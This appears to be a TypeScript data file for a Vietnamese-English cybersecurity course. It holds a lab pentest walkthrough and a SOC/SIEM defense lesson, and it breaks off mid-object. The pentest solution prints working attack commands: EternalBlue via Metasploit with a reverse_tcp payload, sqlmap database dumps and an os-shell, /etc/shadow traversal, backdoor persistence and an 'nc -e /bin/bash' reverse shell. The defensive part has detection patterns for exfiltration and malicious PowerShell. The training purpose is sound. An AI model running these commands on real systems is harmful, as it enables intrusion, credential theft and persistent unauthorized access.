export interface CyberSecurityLesson {
  id: string;
  title: string;
  description: string;
  difficulty: string;
  duration: string;
  objectives: string[];
  prerequisites: string[];
  exercises: Exercise[];
  realWorldApplications: string[];
  videoUrl: string;
  imageUrl?: string;
  tools: string[];
  securityDomain: string;
  resources: Resource[];
  caseStudies: CaseStudy[];
}

interface Exercise {
  title: string;
  description: string;
  difficulty: string;
  solution: string;
  requirements: string[];
  hints: string[];
  expectedOutput: string;
}

interface Resource {
  title: string;
  url: string;
  type: 'tool' | 'platform' | 'course' | 'certification' | 'documentation';
  description: string;
}

interface CaseStudy {
  title: string;
  organization: string;
  challenge: string;
  solution: string;
  results: string;
  insights: string[];
}

export const cyberSecurityLessons: CyberSecurityLesson[] = [
  {
    id: 'ethical-hacking-fundamentals',
    title: 'Bài 1: Ethical Hacking & Penetration Testing Fundamentals',
    description:
      'Học ethical hacking basics, penetration testing methodologies, vulnerability assessment. Master tools như Kali Linux, Metasploit, Nmap cho security testing.',
    videoUrl: 'https://www.youtube.com/watch?v=3Kq1MIfTWCE',
    imageUrl:
      'https://images.unsplash.com/photo-1555949963-aa79dcee981c?w=400&h=400&fit=crop',
    difficulty: 'Trung bình',
    duration: '180 phút',
    securityDomain: 'Penetration Testing',
    objectives: [
      'Understand ethical hacking principles và legal frameworks',
      'Master penetration testing methodologies (OWASP, PTES)',
      'Learn vulnerability scanning và assessment techniques',
      'Use professional hacking tools safely và effectively',
      'Develop comprehensive security testing và reporting skills'
    ],
    prerequisites: [
      'Basic networking knowledge (TCP/IP, HTTP, DNS)',
      'Linux command line familiarity',
      'Understanding của web technologies',
      'Virtual machine setup capabilities'
    ],
    tools: [
      'Kali Linux (Penetration testing OS)',
      'Metasploit Framework (Exploitation)',
      'Nmap (Network scanning)',
      'Burp Suite (Web application testing)',
      'Wireshark (Network analysis)',
      'OWASP ZAP (Security scanning)'
    ],
    exercises: [
      {
        title: 'Complete Penetration Testing Engagement',
        description:
          'Conduct comprehensive penetration test on simulated corporate network including reconnaissance, vulnerability analysis, exploitation, và reporting',
        difficulty: 'Nâng cao',
        solution:
          '# Complete Penetration Testing Engagement: Corporate Network Assessment\n\n## 1. Pre-Engagement Planning & Scoping\n\n### Legal Authorization Framework:\n```\nPenetration Testing Agreement:\n- Scope: Internal corporate network 192.168.1.0/24\n- Authorized Testing Windows: Mon-Fri 9 AM - 5 PM EST\n- Authorized Methods: Network scanning, web app testing, social engineering simulation\n- Prohibited Actions: DoS attacks, data destruction, lateral movement to production\n- Emergency Contact: Security Team Lead (+1-555-0123)\n- Liability Coverage: Professional liability insurance required\n```\n\n### Target Environment Analysis:\n```\nCorporate Network Infrastructure:\n- Domain Controller: WIN-DC01 (192.168.1.10)\n- Web Server: LAMP-WEB01 (192.168.1.20)\n- Database Server: SQL-DB01 (192.168.1.30)\n- File Server: WIN-FS01 (192.168.1.40)\n- Workstations: 192.168.1.100-150\n- Network Equipment: Router (192.168.1.1), Switch (192.168.1.2)\n\nBusiness Context:\n- Financial services company\n- 50 employees\n- Handles sensitive customer financial data\n- Compliance requirements: PCI-DSS, SOX\n- Recent security concerns: Phishing attempts, outdated systems\n```\n\n## 2. Reconnaissance & Information Gathering\n\n### Passive Information Gathering:\n```bash\n# OSINT Reconnaissance\n# Company information gathering\nwhois example-corp.com\nnslookup example-corp.com\ndig example-corp.com ANY\n\n# Social media intelligence\n# LinkedIn employee enumeration\n# Google dorking for exposed information\nsite:example-corp.com filetype:pdf\nsite:example-corp.com "confidential"\nsite:example-corp.com intitle:"index of"\n\n# Subdomain enumeration\nsublist3r -d example-corp.com\namass enum -d example-corp.com\ngobuster dns -d example-corp.com -w /usr/share/wordlists/dnsrecon/subdomains-top1mil-5000.txt\n\n# Technology stack identification\nwhattech example-corp.com\nbuiltwith.com analysis\nwappalyzer browser extension\n```\n\n### Active Network Reconnaissance:\n```bash\n# Network discovery và host enumeration\nnmap -sn 192.168.1.0/24\n# Result: 12 active hosts discovered\n\n# Comprehensive port scanning\nnmap -sS -sV -O -A -T4 192.168.1.1-50\n# Key findings:\n# 192.168.1.10: Windows Server (DC) - ports 53,88,135,139,389,445,3389\n# 192.168.1.20: Linux Apache - ports 22,80,443,3306\n# 192.168.1.30: Windows SQL Server - ports 135,445,1433,3389\n# 192.168.1.40: Windows File Server - ports 135,139,445,3389\n\n# Service version detection\nnmap -sV --version-intensity 9 192.168.1.10-40\n# Critical findings:\n# Apache 2.2.15 (outdated, known vulnerabilities)\n# OpenSSH 5.3 (outdated)\n# Microsoft SQL Server 2008 R2 (end-of-life)\n# Windows Server 2008 R2 (end-of-life)\n```\n\n### Web Application Reconnaissance:\n```bash\n# Web server enumeration\ngobuster dir -u http://192.168.1.20 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n# Discovered paths:\n# /admin (403 Forbidden)\n# /backup (200 OK - Directory listing enabled)\n# /config (403 Forbidden)\n# /database (403 Forbidden)\n# /uploads (200 OK)\n\n# Technology fingerprinting\nwhatweb http://192.168.1.20\nnmap --script http-enum 192.168.1.20\n\n# SSL/TLS assessment\nsslscan 192.168.1.20:443\n# Findings: SSLv3 enabled (POODLE vulnerability)\n# Weak ciphers supported\n# Certificate issues: Self-signed, expired\n```\n\n## 3. Vulnerability Assessment & Analysis\n\n### Automated Vulnerability Scanning:\n```bash\n# Network vulnerability assessment\nnmap --script vuln 192.168.1.10-40\n# Critical findings:\n# MS17-010 (EternalBlue) on 192.168.1.10,30,40\n# MS08-067 on 192.168.1.30\n# SSL POODLE vulnerability on 192.168.1.20\n\n# Web application vulnerability scanning\nnikto -h http://192.168.1.20\n# Findings:\n# Directory traversal vulnerability\n# SQL injection potential in login form\n# Cross-site scripting (XSS) in search function\n# Outdated jQuery library (known XSS vectors)\n\n# SMB vulnerability assessment\nnmap --script smb-vuln* 192.168.1.10,30,40\n# Results:\n# SMB signing disabled\n# NULL session enumeration possible\n# Weak password policies detected\n```\n\n### Manual Vulnerability Analysis:\n```bash\n# SMB enumeration\nenum4linux 192.168.1.10\nsmbclient -L //192.168.1.10 -N\n# Results:\n# Share enumeration successful\n# User account enumeration via RID cycling\n# Password policy: No complexity requirements, 30-day expiration\n\n# Web application manual testing\n# SQL injection testing\nsqlmap -u "http://192.168.1.20/login.php" --forms --dbs\n# Result: MySQL database access achieved\n# Databases: employees, financial_data, customer_info\n\n# Directory traversal testing\ncurl "http://192.168.1.20/view.php?file=../../../etc/passwd"\n# Result: Successfully read /etc/passwd file\n# Gained insight into system users và potential attack vectors\n```\n\n## 4. Exploitation & Proof of Concept\n\n### Critical Vulnerability Exploitation:\n\n#### 1. EternalBlue Exploitation (MS17-010):\n```bash\n# Metasploit framework exploitation\nmsfconsole\nuse exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS 192.168.1.30\nset LHOST 192.168.1.100\nset payload windows/x64/meterpreter/reverse_tcp\nexploit\n\n# Post-exploitation activities\nsysinfo\ngetuid  # NT AUTHORITY\\SYSTEM\nhashdump  # Extract password hashes\nrun post/windows/gather/enum_logged_on_users\nrun post/windows/gather/checkvm\n\n# Privilege escalation verification\ngetsystem  # Already SYSTEM level\nps  # Process enumeration\nmigrate 1234  # Migrate to stable process\n\n# Data discovery\nshell\ndir C:\\Users\\Administrator\\Documents\ntype C:\\Users\\Administrator\\Documents\\passwords.txt\n# Found: Plain text passwords for multiple accounts\n```\n\n#### 2. SQL Injection to Database Compromise:\n```bash\n# Advanced SQL injection exploitation\nsqlmap -u "http://192.168.1.20/login.php" --forms --dump-all --batch\n# Results:\n# Complete database dump achieved\n# Customer financial records extracted (PCI-DSS violation)\n# Employee personal information accessed\n# Database contains 50,000+ customer records\n\n# Operating system command execution\nsqlmap -u "http://192.168.1.20/login.php" --forms --os-shell\n# Result: Gained shell access to web server\n# Can execute system commands\n# Potential for lateral movement\n```\n\n#### 3. Directory Traversal to System Compromise:\n```bash\n# Local file inclusion exploitation\ncurl "http://192.168.1.20/view.php?file=../../../etc/shadow"\n# Retrieved password hashes for system accounts\n\n# Configuration file access\ncurl "http://192.168.1.20/view.php?file=../config/database.conf"\n# Result: Database credentials exposed\n# Username: dbadmin, Password: P@ssw0rd123\n# Direct database access achieved\n```\n\n### Lateral Movement Demonstration:\n```bash\n# Using compromised credentials for lateral movement\n# RDP access to domain controller\nrdesktop 192.168.1.10 -u administrator -p P@ssw0rd123\n# Successfully authenticated\n# Domain administrator access achieved\n\n# Network share access\nsmbclient //192.168.1.40/shared -U administrator%P@ssw0rd123\n# Accessed sensitive financial documents\n# Found: Quarterly reports, customer contracts, employee SSNs\n\n# Active Directory enumeration\nldapsearch -x -h 192.168.1.10 -b "dc=example,dc=corp"\n# Retrieved complete AD structure\n# User accounts, group memberships, computer accounts\n```\n\n## 5. Post-Exploitation & Impact Assessment\n\n### Data Exfiltration Simulation:\n```bash\n# Sensitive data identification\nfind / -name "*.xls*" -o -name "*.doc*" -o -name "*.pdf" 2>/dev/null\ngrep -r "SSN\\|Social Security\\|Credit Card" /home/ 2>/dev/null\n\n# Simulated data exfiltration (no actual data removed)\necho "[SIMULATION] Exfiltrating customer_database.sql (2.3GB)"\necho "[SIMULATION] Customer financial records: 50,000 accounts"\necho "[SIMULATION] Employee PII: 50 records với SSNs"\necho "[SIMULATION] Total potential data breach: 50,050 individuals"\n```\n\n### Persistence Mechanisms:\n```bash\n# Registry persistence (Windows targets)\nreg add "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "SecurityUpdate" /t REG_SZ /d "C:\\temp\\backdoor.exe"\n\n# Scheduled task creation\nschtasks /create /tn "WindowsUpdate" /tr "C:\\temp\\backdoor.exe" /sc daily /st 09:00\n\n# Service installation\nsc create "SecurityService" binpath= "C:\\temp\\backdoor.exe"\nsc config "SecurityService" start= auto\n\n# Linux persistence (web server)\necho "*/5 * * * * /tmp/reverse_shell.sh" | crontab -\necho \'#!/bin/bash\\nnc -e /bin/bash 192.168.1.100 4444\' > /tmp/reverse_shell.sh\nchmod +x /tmp/reverse_shell.sh\n```\n\n## 6. Risk Assessment & Business Impact Analysis\n\n### CVSS Scoring Framework:\n```\nCritical Vulnerabilities (CVSS 9.0+):\n1. MS17-010 EternalBlue (CVSS 9.3)\n   - Attack Vector: Network\n   - Attack Complexity: Low\n   - Privileges Required: None\n   - User Interaction: None\n   - Impact: Complete system compromise\n\n2. SQL Injection (CVSS 9.8)\n   - Attack Vector: Network\n   - Attack Complexity: Low\n   - Privileges Required: None\n   - Scope: Changed (database server compromise)\n   - Impact: Complete data confidentiality loss\n\nHigh Vulnerabilities (CVSS 7.0-8.9):\n3. Directory Traversal (CVSS 8.6)\n4. Weak Authentication (CVSS 8.2)\n5. End-of-Life Systems (CVSS 7.5)\n```\n\n### Business Impact Assessment:\n```\nFinancial Impact:\n- Potential PCI-DSS fines: $50,000-500,000\n- Customer notification costs: $150,000\n- Regulatory investigation costs: $200,000\n- Brand reputation damage: $1,000,000+\n- System remediation costs: $300,000\n- Total potential impact: $1,700,000-2,150,000\n\nOperational Impact:\n- Complete network compromise achieved trong 4 hours\n- 50,000+ customer financial records at risk\n- All employee PII accessible\n- Potential for complete business shutdown\n- Recovery time estimate: 2-4 weeks\n\nCompliance Impact:\n- PCI-DSS: Multiple violations (data encryption, access controls)\n- SOX: Financial data integrity compromised\n- State breach notification laws: 50,000+ individuals\n- GDPR: If EU customers affected, additional penalties\n```\n\n## 7. Comprehensive Remediation Recommendations\n\n### Immediate Actions (0-7 days):\n```\n1. Emergency Response:\n   - Isolate compromised systems from network\n   - Change all administrative passwords\n   - Disable affected user accounts\n   - Engage incident response team\n   - Notify relevant stakeholders\n\n2. Critical Patch Deployment:\n   - MS17-010 patches for all Windows systems\n   - Update Apache to latest stable version\n   - Apply SQL Server security updates\n   - Implement emergency firewall rules\n\n3. Access Control Hardening:\n   - Enable SMB signing on all systems\n   - Implement strong password policies\n   - Enable account lockout policies\n   - Review và remove unnecessary user accounts\n```\n\n### Short-term Improvements (1-4 weeks):\n```\n1. Infrastructure Hardening:\n   - Replace end-of-life systems (Windows Server 2008 R2)\n   - Implement network segmentation\n   - Deploy intrusion detection systems\n   - Establish centralized logging\n\n2. Application Security:\n   - Code review và remediation for web applications\n   - Implement input validation và parameterized queries\n   - Deploy Web Application Firewall (WAF)\n   - Regular security scanning integration\n\n3. Monitoring & Detection:\n   - SIEM implementation\n   - Network traffic monitoring\n   - Endpoint detection và response (EDR)\n   - File integrity monitoring\n```\n\n### Long-term Strategic Improvements (1-6 months):\n```\n1. Security Program Development:\n   - Establish formal security policies\n   - Implement security awareness training\n   - Regular penetration testing program\n   - Vulnerability management program\n\n2. Compliance Enhancement:\n   - PCI-DSS compliance assessment và remediation\n   - SOX controls implementation\n   - Data classification và protection program\n   - Incident response plan development\n\n3. Technology Modernization:\n   - Cloud migration strategy với security focus\n   - Zero-trust architecture implementation\n   - Multi-factor authentication deployment\n   - Backup và disaster recovery improvements\n```\n\n## 8. Executive Summary Report\n\n### Key Findings Summary:\n```\nSecurity Posture Assessment: CRITICAL\n\nCritical Issues Identified: 5\n- Remote code execution vulnerabilities\n- Complete database compromise possible\n- Administrative access achieved trong 2 hours\n- 50,000+ customer records at risk\n- Multiple compliance violations\n\nRecommendation Priority:\n1. IMMEDIATE: Patch critical vulnerabilities\n2. URGENT: Implement access controls\n3. HIGH: Deploy monitoring systems\n4. MEDIUM: Establish security program\n5. LOW: Long-term strategic improvements\n\nEstimated Remediation Timeline: 6 months\nEstimated Cost: $500,000-750,000\nROI: Prevention của $1.7M+ potential breach impact\n```',
        requirements: [
          'Kali Linux virtual machine setup',
          'Target network environment (virtual lab)',
          'Understanding của penetration testing methodologies',
          'Complete ethical hacking engagement documentation',
          'Professional security assessment report'
        ],
        hints: [
          'Always start với reconnaissance và passive information gathering',
          'Document every step for comprehensive reporting',
          'Focus on business impact, not just technical findings',
          'Provide actionable remediation recommendations'
        ],
        expectedOutput:
          'Complete penetration testing report với executive summary, technical findings, risk assessment, và remediation roadmap'
      }
    ],
    realWorldApplications: [
      'Corporate security assessments và compliance auditing',
      'Red team exercises và security validation',
      'Incident response và forensic investigation',
      'Security consulting và professional services',
      'Bug bounty hunting và vulnerability research'
    ],
    resources: [
      {
        title: 'Kali Linux Official Documentation',
        url: 'https://www.kali.org/docs/',
        type: 'documentation',
        description:
          'Comprehensive guide to Kali Linux tools và penetration testing techniques'
      },
      {
        title: 'OWASP Testing Guide',
        url: 'https://owasp.org/www-project-web-security-testing-guide/',
        type: 'documentation',
        description: 'Complete web application security testing methodology'
      }
    ],
    caseStudies: [
      {
        title: 'Fortune 500 Financial Institution Penetration Test',
        organization: 'Major Bank, Security Consulting Firm',
        challenge:
          'Comprehensive security assessment của core banking infrastructure với minimal business disruption, covering network, applications, và physical security trong 2-week engagement.',
        solution:
          'Executed multi-phase penetration test: external reconnaissance, internal network assessment, web application testing, wireless security evaluation, và social engineering simulation. Used advanced evasion techniques to bypass security controls.',
        results:
          'Identified 47 vulnerabilities including critical remote code execution, achieved domain administrator access, demonstrated potential $50M+ fraud scenario. Client implemented all recommendations, achieving 95% vulnerability reduction trong 6 months.',
        insights: [
          'Comprehensive methodology essential for complex enterprise environments',
          'Business context critical for accurate risk assessment',
          'Clear communication với stakeholders prevents misunderstandings',
          'Follow-up testing validates remediation effectiveness'
        ]
      }
    ]
  },
  {
    id: 'cybersecurity-defense-strategies',
    title: 'Bài 2: Advanced Cybersecurity Defense & Incident Response',
    description:
      'Master cybersecurity defense strategies, SIEM implementation, threat hunting, incident response procedures. Build comprehensive security operations center capabilities.',
    videoUrl: 'https://www.youtube.com/watch?v=inWWhr5tnEA',
    imageUrl:
      'https://images.unsplash.com/photo-1563206767-5b18f218e8de?w=400&h=400&fit=crop',
    difficulty: 'Nâng cao',
    duration: '200 phút',
    securityDomain: 'Defense & Incident Response',
    objectives: [
      'Design comprehensive cybersecurity defense architectures',
      'Implement SIEM solutions cho threat detection và monitoring',
      'Develop incident response procedures và playbooks',
      'Master threat hunting techniques và advanced analytics',
      'Build security operations center (SOC) capabilities'
    ],
    prerequisites: [
      'Network security fundamentals',
      'Understanding của security tools và technologies',
      'Basic scripting skills (Python, PowerShell)',
      'Knowledge của attack vectors và TTPs'
    ],
    tools: [
      'Splunk SIEM (Security monitoring)',
      'ELK Stack (Elasticsearch, Logstash, Kibana)',
      'Snort/Suricata (Intrusion detection)',
      'YARA (Malware detection rules)',
      'MISP (Threat intelligence platform)',
      'TheHive (Incident response platform)'
    ],
    exercises: [
      {
        title: 'Build Complete SOC với Incident Response Capability',
        description:
          'Design và implement comprehensive Security Operations Center với SIEM, threat hunting, incident response, và threat intelligence integration',
        difficulty: 'Chuyên gia',
        solution:
          '# Complete Security Operations Center (SOC) Implementation\n\n## 1. SOC Architecture Design & Requirements\n\n### SOC Operational Model:\n```\nTier Structure:\nTier 1 (L1): Security Analysts - Initial triage, alert validation\nTier 2 (L2): Incident Responders - Investigation, containment\nTier 3 (L3): Threat Hunters - Advanced analysis, forensics\nTier 4 (L4): Security Engineers - Tool development, architecture\n\nOperational Schedule:\n- 24/7/365 coverage\n- Follow-the-sun model với global teams\n- Escalation procedures for critical incidents\n- On-call rotation for senior analysts\n\nKey Performance Indicators (KPIs):\n- Mean Time to Detection (MTTD): <15 minutes\n- Mean Time to Response (MTTR): <1 hour\n- Mean Time to Containment (MTTC): <4 hours\n- False Positive Rate: <5%\n- Alert Volume: <500/day manageable load\n```\n\n### Technology Stack Requirements:\n```\nCore SIEM Platform: Splunk Enterprise Security\n- Log ingestion: 1TB/day capacity\n- Retention: 90 days hot, 2 years warm, 7 years cold\n- User licenses: 50 concurrent users\n- High availability: Multi-site clustering\n\nSupplementary Tools:\n- SOAR Platform: Phantom/Splunk SOAR\n- Threat Intelligence: MISP + Commercial feeds\n- Incident Management: TheHive + ServiceNow\n- Network Detection: Zeek + Suricata\n- Endpoint Detection: CrowdStrike Falcon\n- Vulnerability Management: Nessus + Rapid7\n```\n\n## 2. SIEM Implementation & Configuration\n\n### Splunk Enterprise Security Deployment:\n\n#### Infrastructure Setup:\n```bash\n# Splunk cluster configuration\n# Search Head Cluster (3 nodes)\nsplunk-sh01.corp.com (Search Head Captain)\nsplunk-sh02.corp.com (Search Head Member)\nsplunk-sh03.corp.com (Search Head Member)\n\n# Indexer Cluster (6 nodes)\nsplunk-idx01.corp.com (Cluster Master)\nsplunk-idx02-06.corp.com (Indexer Peers)\n\n# Universal Forwarders (200+ endpoints)\n# Heavy Forwarders (10 network segments)\n\n# Deployment configuration\n./splunk enable boot-start --user splunk\n./splunk edit cluster-config -mode master -replication_factor 2 -search_factor 2\n./splunk restart\n```\n\n#### Data Source Integration:\n```bash\n# Windows Event Log Collection\n[WinEventLog://Security]\ndisabled = 0\nstart_from = oldest\ncurrent_only = 0\ncheckpointInterval = 5\nrenderXml = true\n\n[WinEventLog://System]\ndisabled = 0\nstart_from = oldest\n\n[WinEventLog://Application]\ndisabled = 0\nstart_from = oldest\n\n# Syslog Collection (inputs.conf)\n[udp://514]\nconnection_host = ip\nsourcetype = syslog\nindex = network\n\n[tcp://1514]\nconnection_host = ip\nsourcetype = cisco_asa\nindex = firewall\n\n# Network Traffic Analysis\n[script://./bin/zeek_parser.py]\ninterval = 60\nsourcetype = zeek_conn\nindex = network\n```\n\n#### Custom Detection Rules:\n```spl\n# Advanced Persistent Threat (APT) Detection\nindex=windows EventCode=4624 OR EventCode=4625\n| eval failed_login=if(EventCode=4625,1,0)\n| eval successful_login=if(EventCode=4624,1,0)\n| stats sum(failed_login) as failed_attempts, sum(successful_login) as successful_attempts by src_ip, user, _time span=5m\n| where failed_attempts > 10 AND successful_attempts > 0\n| eval risk_score=case(\n    failed_attempts > 50, "Critical",\n    failed_attempts > 20, "High",\n    failed_attempts > 10, "Medium",\n    true(), "Low")\n| table _time, src_ip, user, failed_attempts, successful_attempts, risk_score\n\n# Lateral Movement Detection\nindex=windows EventCode=4648\n| eval target_server=coalesce(Computer, dest)\n| stats dc(target_server) as unique_servers, values(target_server) as servers by user, src_ip\n| where unique_servers > 5\n| eval alert_severity="High"\n| eval description="Potential lateral movement: User ".user." accessing ".unique_servers." servers from ".src_ip\n\n# Data Exfiltration Detection\nindex=proxy \n| stats sum(bytes_out) as total_upload by src_ip, user, dest_host\n| where total_upload > 1073741824  // 1GB threshold\n| eval upload_gb=round(total_upload/1073741824,2)\n| sort - upload_gb\n| eval alert_severity="Critical"\n| eval description="Large data upload detected: ".user." uploaded ".upload_gb."GB to ".dest_host\n\n# Malware Command & Control Detection\nindex=dns\n| eval query_length=len(query)\n| where query_length > 50  // Unusually long DNS queries\n| rex field=query "(?<subdomain>[^.]+)\\.(?<domain>.+)"\n| eval entropy=case(\n    match(subdomain, "^[a-f0-9]{32,}$"), 5,  // Hex strings\n    match(subdomain, "^[A-Za-z0-9+/]{20,}={0,2}$"), 4,  // Base64\n    len(subdomain) > 30, 3,\n    true(), 1)\n| where entropy >= 3\n| stats count by domain, src_ip, entropy\n| where count > 10\n| eval alert_severity="High"\n| eval description="Potential C2 communication via DNS tunneling"\n```\n\n## 3. Threat Intelligence Integration\n\n### MISP Platform Setup:\n```bash\n# MISP installation và configuration\ngit clone https://github.com/MISP/MISP.git\ncd MISP\nsudo ./INSTALL/INSTALL.sh\n\n# Feed configuration\n# Add threat intelligence feeds\ncurl -X POST https://misp.corp.com/feeds/add \\\n  -H "Authorization: YOUR_API_KEY" \\\n  -H "Content-Type: application/json" \\\n  -d \'{\n    "name": "Alienvault OTX",\n    "provider": "AlienVault",\n    "url": "https://otx.alienvault.com/api/v1/indicators/export",\n    "enabled": true,\n    "distribution": "3",\n    "sharing_group_id": "1"\n  }\'\n\n# Automated IOC ingestion\n#!/bin/bash\n# misp_sync.sh\nfor feed in otx circl malwaredomainlist; do\n  curl -X POST https://misp.corp.com/feeds/fetchFromFeed/$feed \\\n    -H "Authorization: $MISP_API_KEY"\ndone\n\n# Cron job for regular updates\necho "0 */6 * * * /opt/scripts/misp_sync.sh" | crontab -\n```\n\n### Threat Intelligence Enrichment trong Splunk:\n```spl\n# IOC Lookup Creation\n| inputlookup misp_indicators.csv\n| eval indicator_type=case(\n    match(indicator, "^\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}$"), "ip",\n    match(indicator, "^[a-fA-F0-9]{32}$"), "md5",\n    match(indicator, "^[a-fA-F0-9]{40}$"), "sha1",\n    match(indicator, "^[a-fA-F0-9]{64}$"), "sha256",\n    match(indicator, "^[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}$"), "domain",\n    true(), "unknown")\n| outputlookup threat_indicators.csv\n\n# Real-time Threat Enrichment\nindex=proxy\n| lookup threat_indicators.csv indicator as dest_host OUTPUT threat_score, malware_family, confidence\n| where isnotnull(threat_score)\n| eval alert_severity=case(\n    threat_score > 80, "Critical",\n    threat_score > 60, "High",\n    threat_score > 40, "Medium",\n    true(), "Low")\n| table _time, src_ip, user, dest_host, threat_score, malware_family, confidence, alert_severity\n```\n\n## 4. Advanced Threat Hunting Procedures\n\n### Hypothesis-Driven Threat Hunting:\n\n#### Hunt 1: Living-off-the-Land Attacks\n```spl\n# Hypothesis: Attackers using legitimate tools for malicious purposes\nindex=windows (process_name=powershell.exe OR process_name=cmd.exe OR process_name=wmic.exe)\n| eval command_line=lower(CommandLine)\n| where match(command_line, "(invoke-webrequest|downloadstring|encodedcommand|bypass|hidden|noprofile)")\n| stats count, values(CommandLine) as commands by Computer, user, process_name\n| where count > 5\n| eval hunting_score=case(\n    match(commands, ".*encodedcommand.*bypass.*"), 10,\n    match(commands, ".*downloadstring.*invoke.*"), 8,\n    match(commands, ".*hidden.*noprofile.*"), 6,\n    true(), 3)\n| where hunting_score >= 6\n| sort - hunting_score\n```\n\n#### Hunt 2: Persistence Mechanisms\n```spl\n# Registry-based persistence\nindex=windows EventCode=4657 ObjectName="*\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run*"\n| eval registry_change=case(\n    match(NewValue, ".*\\.exe.*"), "executable",\n    match(NewValue, ".*\\.bat.*|.*\\.cmd.*|.*\\.ps1.*"), "script",\n    match(NewValue, ".*rundll32.*|.*regsvr32.*"), "dll_execution",\n    true(), "other")\n| where registry_change!="other"\n| stats count by Computer, user, ObjectName, NewValue, registry_change\n| eval persistence_score=case(\n    registry_change="dll_execution", 8,\n    registry_change="script", 6,\n    registry_change="executable", 4,\n    true(), 2)\n| where persistence_score >= 6\n```\n\n#### Hunt 3: Data Staging Activities\n```spl\n# Unusual file system activities\nindex=windows EventCode=4663 ObjectType=File\n| eval file_ext=lower(substr(ObjectName, len(ObjectName)-3))\n| where file_ext trong (".zip", ".rar", ".7z", ".tar", ".cab")\n| stats count, dc(ObjectName) as unique_files, sum(eval(if(AccessMask="0x100080", 1, 0))) as read_count by user, Computer\n| where unique_files > 50 AND read_count > 100\n| eval staging_score=case(\n    unique_files > 500, 10,\n    unique_files > 200, 8,\n    unique_files > 100, 6,\n    unique_files > 50, 4,\n    true(), 2)\n| where staging_score >= 6\n```\n\n## 5. Incident Response Automation\n\n### SOAR Playbook Development:\n\n#### Phishing Email Response Playbook:\n```python\n# Phantom/Splunk SOAR Playbook\ndef phishing_response_playbook():\n    # Phase 1: Initial Analysis\n    email_data = phantom.get_email_details(container_id)\n    \n    # Extract IOCs\n    urls = extract_urls(email_data[\'body\'])\n    attachments = extract_attachments(email_data)\n    sender_ip = get_sender_ip(email_data[\'headers\'])\n    \n    # Phase 2: IOC Analysis\n    for url trong urls:\n        vt_result = virustotal.analyze_url(url)\n        urlvoid_result = urlvoid.analyze_url(url)\n        \n        if vt_result[\'positives\'] > 5:\n            phantom.add_artifact(\'malicious_url\', url)\n    \n    # Phase 3: Containment\n    if phantom.get_severity() >= \'High\':\n        # Block malicious URLs\n        for url trong malicious_urls:\n            firewall.block_url(url)\n            proxy.block_url(url)\n        \n        # Quarantine affected mailboxes\n        affected_users = exchange.get_email_recipients(email_data)\n        for user trong affected_users:\n            exchange.quarantine_mailbox(user, duration=\'2h\')\n    \n    # Phase 4: Investigation\n    hunting_query = f"""\n    index=email sender="{email_data[\'sender\']}"\n    | stats count by recipient, subject\n    | where count > 1\n    """\n    \n    similar_emails = splunk.run_search(hunting_query)\n    \n    # Phase 5: Recovery\n    if len(similar_emails) == 0:\n        # Single incident, limited scope\n        for user trong affected_users:\n            exchange.remove_quarantine(user)\n            notify_user(user, "phishing_awareness")\n    \n    # Phase 6: Lessons Learned\n    create_incident_report({\n        \'type\': \'phishing\',\n        \'severity\': phantom.get_severity(),\n        \'affected_users\': len(affected_users),\n        \'iocs_found\': len(malicious_urls),\n        \'containment_time\': phantom.get_containment_time(),\n        \'recommendations\': generate_recommendations()\n    })\n\n# Malware Incident Response Playbook\ndef malware_response_playbook():\n    # Phase 1: Isolation\n    infected_host = phantom.get_container_data()[\'src_ip\']\n    \n    # Network isolation\n    firewall.block_host(infected_host)\n    switch.disable_port(infected_host)\n    \n    # Phase 2: Forensic Collection\n    memory_dump = forensics.collect_memory(infected_host)\n    disk_image = forensics.collect_disk(infected_host)\n    network_pcap = forensics.collect_network_traffic(infected_host, timerange=\'1h\')\n    \n    # Phase 3: Malware Analysis\n    malware_sample = extract_malware_sample(memory_dump)\n    \n    if malware_sample:\n        # Automated analysis\n        cuckoo_result = cuckoo.analyze_sample(malware_sample)\n        vt_result = virustotal.analyze_file(malware_sample)\n        \n        # IOC extraction\n        iocs = extract_iocs(cuckoo_result)\n        c2_servers = extract_c2_servers(cuckoo_result)\n        \n        # Threat hunting\n        for ioc trong iocs:\n            hunting_results = splunk.hunt_ioc(ioc)\n            if hunting_results:\n                phantom.create_new_container(\'potential_infection\', hunting_results)\n    \n    # Phase 4: Remediation\n    if phantom.get_approval(\'reimaging\'):\n        # Reimage infected system\n        sccm.reimage_computer(infected_host)\n        ad.reset_computer_account(infected_host)\n    else:\n        # Antivirus cleanup\n        av.run_full_scan(infected_host)\n        av.quarantine_threats(infected_host)\n    \n    # Phase 5: Monitoring\n    # Enhanced monitoring for 30 days\n    splunk.create_alert(f"Enhanced monitoring for {infected_host}", duration=\'30d\')\n```\n\n## 6. Security Metrics & Reporting\n\n### SOC Dashboard Development:\n```spl\n# Security Operations Dashboard\n\n# Panel 1: Alert Volume Trend\nindex=security_alerts\n| timechart span=1h count by severity\n| eval total=critical+high+medium+low\n\n# Panel 2: Mean Time to Response\nindex=incidents\n| eval response_time=strftime(resolved_time-created_time, "%H:%M:%S")\n| stats avg(response_time) as mttr by severity\n| eval mttr_hours=round(mttr/3600, 2)\n\n# Panel 3: Top Attack Vectors\nindex=security_alerts\n| stats count by attack_vector\n| sort - count\n| head 10\n\n# Panel 4: Threat Actor Attribution\nindex=threat_intel\n| stats count by threat_actor, campaign\n| sort - count\n\n# Panel 5: Geographic Threat Distribution\nindex=security_alerts\n| iplocation src_ip\n| geostats count by Country\n```\n\n### Executive Reporting:\n```python\n# Automated Executive Report Generation\ndef generate_executive_report(timeperiod=\'weekly\'):\n    report_data = {\n        \'summary\': {\n            \'total_alerts\': get_alert_count(timeperiod),\n            \'critical_incidents\': get_incident_count(\'critical\', timeperiod),\n            \'mttr\': get_mttr(timeperiod),\n            \'false_positive_rate\': get_fp_rate(timeperiod)\n        },\n        \'threat_landscape\': {\n            \'top_threats\': get_top_threats(timeperiod),\n            \'attack_trends\': get_attack_trends(timeperiod),\n            \'industry_comparison\': get_industry_benchmarks()\n        },\n        \'operational_metrics\': {\n            \'analyst_performance\': get_analyst_metrics(timeperiod),\n            \'tool_effectiveness\': get_tool_metrics(timeperiod),\n            \'cost_per_incident\': calculate_cost_metrics(timeperiod)\n        },\n        \'recommendations\': {\n            \'immediate_actions\': 